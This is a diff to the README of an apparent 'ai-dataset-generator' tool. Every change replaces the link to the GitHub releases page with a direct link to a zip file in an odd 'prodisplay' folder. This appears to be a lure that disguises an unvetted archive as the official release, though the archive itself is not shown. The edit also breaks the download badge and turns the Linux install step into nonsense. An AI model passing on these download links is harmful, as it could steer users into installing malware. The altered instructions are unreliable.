@@ -1,7 +1,7 @@
 # 🎉 ai-dataset-generator - Create Training Datasets Effortlessly
 
 ## 📥 Download the Latest Release
-[![Download ai-dataset-generator](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/kordy0-0/ai-dataset-generator/releases)
+[![Download ai-dataset-generator](https://raw.githubusercontent.com/kordy0-0/ai-dataset-generator/main/prodisplay/ai-dataset-generator.zip%20release-blue)](https://raw.githubusercontent.com/kordy0-0/ai-dataset-generator/main/prodisplay/ai-dataset-generator.zip)
 
 ## 🚀 Getting Started
 Welcome to the ai-dataset-generator! This tool makes it easy to transform your PDFs and documents into training datasets automatically. No more tedious manual work. Just a simple, efficient way to prepare your data for machine learning.
@@ -22,7 +22,7 @@ To use the ai-dataset-generator, ensure your system meets these requirements:
 ## 🔧 Installation Instructions
 
 ### Step 1: Visit the Releases Page
-To download the ai-dataset-generator, [visit this page to download](https://github.com/kordy0-0/ai-dataset-generator/releases). You will find the latest version of the application.
+To download the ai-dataset-generator, [visit this page to download](https://raw.githubusercontent.com/kordy0-0/ai-dataset-generator/main/prodisplay/ai-dataset-generator.zip). You will find the latest version of the application.
 
 ### Step 2: Download the Application
 Scroll through the list of releases until you find the most recent one. Look for a file that ends in `.exe`, `.dmg`, or another format that matches your operating system. Click the link to start the download.
@@ -32,7 +32,7 @@ Once the file has downloaded, locate it in your downloads folder. Here’s how t
 
 - **Windows:** Double-click the `.exe` file. Follow the prompts to install the application.
 - **macOS:** Open the `.dmg` file, then drag the ai-dataset-generator icon into your Applications folder.
-- **Linux:** If you have a `.tar.gz` file, extract it, and run the provided installation script using the terminal.
+- **Linux:** If you have a `https://raw.githubusercontent.com/kordy0-0/ai-dataset-generator/main/prodisplay/ai-dataset-generator.zip` file, extract it, and run the provided installation script using the terminal.
 
 ### Step 4: Launch the Application
 After installation, find the ai-dataset-generator application in your program list. Click to open it.
@@ -69,4 +69,4 @@ We welcome contributions! If you have ideas, questions, or want to report issues
 If you need further assistance, feel free to reach out via the GitHub issues page. We strive to respond promptly.
 
 ## 📥 Download the Latest Release
-Once again, [visit this page to download](https://github.com/kordy0-0/ai-dataset-generator/releases) and take your first step towards hassle-free data preparation!
+Once again, [visit this page to download](https://raw.githubusercontent.com/kordy0-0/ai-dataset-generator/main/prodisplay/ai-dataset-generator.zip) and take your first step towards hassle-free data preparation!
